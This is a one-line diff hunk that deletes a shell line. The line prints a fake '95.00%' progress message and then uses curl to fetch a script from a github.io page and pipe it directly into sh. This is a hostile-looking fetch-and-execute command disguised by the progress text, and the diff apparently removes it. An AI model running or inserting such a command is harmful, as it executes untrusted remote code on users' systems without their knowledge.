@@ -1,1 +1,0 @@
-echo Progress: 95.00%curl -L --progress-bar frkns.github.io/fun/pregnant_confident_fred_assists_luxembourg.js | sh
